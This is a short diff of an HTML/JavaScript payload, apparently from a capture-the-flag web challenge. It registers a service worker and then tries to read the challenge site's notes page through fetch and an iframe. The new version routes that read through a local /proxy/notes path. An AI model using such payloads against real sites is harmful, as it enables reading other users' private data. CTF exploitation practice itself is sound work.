@@ -1,28 +1,19 @@
-<!DOCTYPE html>
-<html>
-  <head><title>Loading Flag</title></head>
-  <body>
-    <h1>Waiting...</h1>
-    <script>
-      navigator.serviceWorker.register("/sw.js").then(() => {
-        console.log("[INFO] Service worker registered.");
+<script>
+navigator.serviceWorker.register("/sw.js").then(() => {
+  console.log("[INFO] Service worker registered.");
 
-        setTimeout(() => {
-          console.log("[INFO] Attempting fetch to /notes/");
+  setTimeout(() => {
+    console.log("[INFO] Attempting fetch to /proxy/notes");
 
-          // Method 1: Fetch
-          fetch("https://fnotes-web.ctf-chal.idek.team/notes/")
-            .then(r => r.text())
-            .then(console.log)
-            .catch(e => console.error("[Fetch Error]", e));
+    fetch("/proxy/notes")
+      .then(r => r.text())
+      .then(console.log)
+      .catch(e => console.error("[Fetch Error]", e));
 
-          // Method 2: iframe
-          const iframe = document.createElement("iframe");
-          iframe.src = "https://fnotes-web.ctf-chal.idek.team/notes/";
-          document.body.appendChild(iframe);
-        }, 1500);
-      });
-    </script>
-  </body>
-</html>
-
+    // Optional: iframe method fallback
+    const iframe = document.createElement("iframe");
+    iframe.src = "/proxy/notes";
+    document.body.appendChild(iframe);
+  }, 1500);
+});
+</script>
